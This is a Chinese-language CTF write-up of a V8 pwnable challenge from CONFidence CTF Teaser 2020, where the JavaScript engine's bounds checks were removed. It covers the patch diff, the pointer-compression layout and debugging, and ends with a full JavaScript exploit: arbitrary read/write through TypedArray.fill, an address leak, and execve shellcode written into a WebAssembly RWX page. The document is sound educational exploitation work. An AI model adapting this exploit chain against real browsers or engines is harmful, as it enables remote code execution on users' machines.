# CONFidence CTF Teaser 2020
## pwnable / 182 - Chromatic Aberration

> Pwn our chrome for fun and profit.
> Ok, it's not really Chrome, but it's close enough.
> Let's say, it's chromatic
> 
> The memory limit is 64MB

## Solution
By [@h3xr4bbit](https://twitter.com/h3xr4bb1t) ([Blog post](https://blog.hexrabbit.io/2020/03/16/chromatic-aberration-writeup/))

這算是我第一次解 javascript engine 的題目，之前雖然有稍微看過別人的 writeup 但是沒有自己撰寫 exploit 的經驗，雖然在一天內往腦袋裡塞進一堆 v8 的相關知識實在是有點吃不消，不過這題相對來說算是 v8 的入門題，解起來蠻有趣也學到不少新知識，有點可惜的是我是在完賽後 1 小時才解出來，~~早知道不睡了~~

因為與 v8 相關的知識有點雜亂且有不少人寫過了，加上我也沒多熟，所以這篇會著重在解題思路跟我碰到的問題上

### 漏洞

雖然 `readme` 裡有提供本次題目使用的 v8 版本資訊(commit hash)，但這次的題目居然直接是 debug build 的 v8，自己不用重編一次實在是感激不盡QQ

本題的 bug 還蠻簡單的，從 `diff.diff` 中可以大致得知有兩個邊界檢查被拿掉了，一個是和 String 有關，另一個則是與 TypedArray 有關

```javascript
src/builtins/builtins-string.tq
@@ -81,7 +81,7 @@ namespace string {
         const kMaxStringLengthFitsSmi: constexpr bool =
             kStringMaxLengthUintptr < kSmiMaxValue;
         StaticAssert(kMaxStringLengthFitsSmi);
-        if (index >= length) goto IfOutOfBounds;
+        // if (index >= length) goto IfOutOfBounds;
         goto IfInBounds(string, index, length);
       }
```

```javascript
src/builtins/builtins-typed-array.cc
@@ -131,13 +131,15 @@ BUILTIN(TypedArrayPrototypeFill) {
     if (!num->IsUndefined(isolate)) {
       ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
           isolate, num, Object::ToInteger(isolate, num));
-      start = CapRelativeIndex(num, 0, len);
+      //start = CapRelativeIndex(num, 0, len);
+      start = CapRelativeIndex(num, 0, 100000000);
 
       num = args.atOrUndefined(isolate, 3);
       if (!num->IsUndefined(isolate)) {
         ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
             isolate, num, Object::ToInteger(isolate, num));
-        end = CapRelativeIndex(num, 0, len);
+        //end = CapRelativeIndex(num, 0, len);
+        end = CapRelativeIndex(num, 0, 100000000);
       }
     }
   }
```

追進 v8 原始碼裡很容易的就可以發現 String 的檢查繞過，可以用以下三種方式來觸發:
- `String.prototype.charAt`
- `String.prototype.charCodeAt`
- `String.prototype.codePointAt`

而 TypedArray 的繞過則是在呼叫 `TypedArray.prototype.fill` 的時候觸發，不過 javascript 中並沒有這個 class，這裡是泛指所有帶型別的 Array 例如: 
- `Int8Array`
- `Uint32Array`
- `Float64Array`

([TypedArray | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray))

### 開始 debug
看到這裡我就覺得，咦任意 read/write 有這麼爽的嗎，看來這題是可以解了吧(?)

至於該怎麼 debug，在我參考了一些以前的 writeup 之後，得知在 debug build 的 v8 裡可以用 `%DebugPrint(var)` 印出一些 internal 的資訊。不過那些 internal structure 的詳細結構我翻 source code 翻半天也沒看出個所以然，最後決定參考 halbecaf 的[文章](https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/)中的結構
```
 0x0|-------------------------
    |kMapOffset
 0x8|-------------------------
    |kPropertiesOffset
0x10|-------------------------
    |kElementsOffset
0x18|-------------------------
    |kLengthOffset
0x20|-------------------------
```

原以為有任意讀寫會很順利，沒想到打開 gdb 開始 debug 才發現不太對勁
```
gef➤  x/10gx 0x34308082590
0x34308082590:  0x080406e9081c04e1      0x0808255508082585
0x343080825a0:  0x0000000000000000      0x0000000000000004
0x343080825b0:  0x0000000000000004      0x0000034300000007
0x343080825c0:  0x0000000008082585      0x0000000000000000
0x343080825d0:  0x08040a1500000000      0x9999999a00000008
```

上面是 print 出一個 `v8::internal::JSArray` 的記憶體資訊，很明顯地跟 halbecaf 提到的不同，這些數值看起來一點都不像是個合理的指標


不過我很快就發現若是用 4 byte 為單位來印的話似乎是某種 offset (?)
```
gef➤  x/10wx 0x34308082590
0x34308082590:  0x081c04e1      0x080406e9      0x08082585      0x08082555
0x343080825a0:  0x00000000      0x00000000      0x00000004      0x00000000
```
接著對照 `vmmap` 的輸出就大致確信這裡儲存的確實是 v8 內部 mmap 的地址的 offset
```
0x0000034308140000 0x0000034308141000 0x0000000000000000 rw-                                 
0x0000034308141000 0x0000034308180000 0x0000000000000000 ---
0x0000034308180000 0x0000034308200000 0x0000000000000000 rw-        
0x0000034308200000 0x0000034400000000 0x0000000000000000 --- 
```

看來很明顯是我漏看了一些資訊，回頭瀏覽了題目資料夾中的其他檔案後，就發現在 `v8_build_config` 裡有這麼一個設定 `"v8_enable_pointer_compression": true`，看來是藉由只儲存 offset 來降低記憶體開銷的設計

在這上面耗了不少時間之後，最後總算從 v8 的 issue tracker 上的討論串 [Issue 7703: Compressed pointers in V8](https://bugs.chromium.org/p/v8/issues/detail?id=7703) 找到一份 pointer compression 的[文件](https://docs.google.com/document/d/10qh2-b4C5OtSg-xLwyZpEI5ZihVBPtn1xwKBbQC26yI)

從 [src/common/ptr-compr.h](https://chromium.googlesource.com/v8/v8.git/+/refs/heads/master/src/common/ptr-compr-inl.h) 中可以確定這個版本的 v8 上採用的是文件中提到的 Variant 2，也就是 4GB-aligned 的版本，會在儲存指標時只存最後 32bit 作為 offset，要存取該指標時才加上一個 base pointer 解壓縮，將記憶體資訊對照 `%DebugPrint(var)` 的輸出也會發現其實整體的結構並沒有差太多，只是儲存單位從 8byte 變成 4byte 而已

接下來參考一些 writeup 後 (放在下方[參考資料](#參考資料)處) 便知道可以透過改寫 `JSArray` 內部的指標來達到任意寫入，以及可以從每個 mmap 的 page 的最開始處 leak 出指向 mmap page 上物件的指標，前者可以利用 TypeArray，後者則可以用 String 的漏洞來達成，看起來是如此的完美

...問題是這次有開啟 `v8_enable_pointer_compression`，內部在操作前會先加上一個 base pointer，所以沒辦法任意放指標進去QQ (例如說 heap, libc 的 address)

我在這裡卡了好久，最後決定先去睡覺XD


### 意外的發現

隔天睡醒之後用 `%DebugPrint` 玩了一陣子才突然發現 `JSTypedArray` 印出的資訊裡有這麼一項別的 type 所沒有的：
```
 - data_ptr: 0x3430808267c
   - base_pointer: 0x8082675
   - external_pointer: 0x34300000007
```
其中 `external_pointer` 正是我所需要的資訊，用 gdb 也可以確認到在附近的 offset 存有這個值，簡單用 gdb 改掉值測試之後確實可以正常讀取寫入，總算發現出題者的思路了(!)


有了這些資訊之後，就能大致想出該怎麼解： 
(有趣的是解這題只需要用到 TypedArray 的漏洞)
- 分配兩個 TypedArray A, B
- 利用漏洞繞過檢查，改寫 A array 本身的長度
- leak base address
- 用 A array 改寫 B array 的內部指標
- 利用 B array 任意讀寫

最後彈 shell 可以利用 v8 中 WebAssembly 的 code 在編譯完之後會被放在一個 rwx 的 page 上的特性(?)，透過任意寫寫入 shellcode 最後執行該 function 就可以拿到 flag 啦

Flag: `p4{c0mPIling_chr@mium_1s_h4rd_ok?}`

## Exploit
```javascript
a = new Uint8Array([0xee,0xee,0xee,0xee]);
b = new Float64Array([1.1,1.1,1.1,1.1]);
c = new Array({},2,3,4); // offset(a->c) == 0x188
// d = new String('pwned') // actually, we don't need this lol

// credits to google ctf:
// https://github.com/google/google-ctf/blob/master/2018/finals/pwn-just-in-time/exploit/index.html
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);

BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};

BigInt.prototype.i2f = function() {
  int_view[0] = this;
  return float_view[0];
}

Number.prototype.hex = function() {
  return '0x' + this.toString(16);
};

Number.prototype.f2i = function() {
  float_view[0] = this;
  return int_view[0];
}

// make itself long enough to overwrite b
a.fill(0xff, 28, 30);
a.fill(0xff, 36, 38);

// leak base
// mmap_base = BigInt(d.charCodeAt(-0xe6c0) + (d.charCodeAt(-0xe6c0 + 1) << 8)) << 32n
mmap_base = BigInt(a[0x13c] + (a[0x13d] << 8)) << 32n
console.log('mmap base:', mmap_base.hex())

function addr_of(x) {
  c[0] = x
  offset = a[0x188] + (a[0x189]<<8) + (a[0x18a]<<16) + (a[0x18b]<<24)
  return mmap_base + BigInt(offset) - 1n
}

function leak(address, bytes=8) {
  address -= 8n
  hi = Number(address >> 32n)
  lo = Number(address & 0xffffffffn) + 1

  for(let i = 0; i < 4; i++) {
    bt = hi & 0xff
    hi >>= 8
    a.fill(bt, 0x13c+i, 0x13d+i);
    bt = lo & 0xff
    lo >>= 8
    a.fill(bt, 0x140+i, 0x141+i);
  }

  mask = 0xFFFFFFFFFFFFFFFFn >> BigInt(64-8*bytes)
  return b[0].f2i() & mask
}

function leak_comp_untag(address) {
  return mmap_base + leak(address, 4) - 1n
}

function write(address, value) {
  address -= 8n
  hi = Number(address >> 32n)
  lo = Number(address & 0xffffffffn) + 1

  for(let i = 0; i < 4; i++) {
    bt = hi & 0xff
    hi >>= 8
    a.fill(bt, 0x13c+i, 0x13d+i);
    bt = lo & 0xff
    lo >>= 8
    a.fill(bt, 0x140+i, 0x141+i);
  }

  b[0] = value.i2f()
}


// https://mbebenita.github.io/WasmExplorer/
// (module
//  (export "main" (func $main))
//   (func $main (; 0 ;) (result i32)
//     (i32.const 42)
//  )
// )
var wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01,
    0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60, 0x00, 0x01,
    0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00,
    0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x88,
    0x80, 0x80, 0x80, 0x00, 0x01, 0x04, 0x6d, 0x61, 0x69,
    0x6e, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00,
    0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x2a,
    0x0b
]);

var shellcode = new Uint8Array([
    0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0,
    0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f,
    0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05
])

var wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code))
var pwned = wasm_instance.exports.main;

var inst_addr = addr_of(wasm_instance)
var rwx_addr = leak(inst_addr + 0x68n, 8)
console.log('rwx buffer:', rwx_addr.hex())

for (var i in shellcode) {
  write(rwx_addr + BigInt(i), BigInt(shellcode[i]))
}

pwned()
```

寫在最後，如果文內有任何錯誤或是有啃 v8 原始碼相關的建議歡迎來信XD

## Reference
- [Exploiting v8: *CTF 2019 oob-v8](https://syedfarazabrar.com/2019-12-13-starctf-oob-v8-indepth/)
- [Exploiting a V8 OOB write.](https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/)
- [Exploiting Chrome V8: Krautflare (35C3 CTF 2018)](https://www.jaybosamiya.com/blog/2019/01/02/krautflare/)
- [roll_a_d8-v8利用学习](http://dittozzz.top/2019/07/02/roll-a-d8-v8%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/)
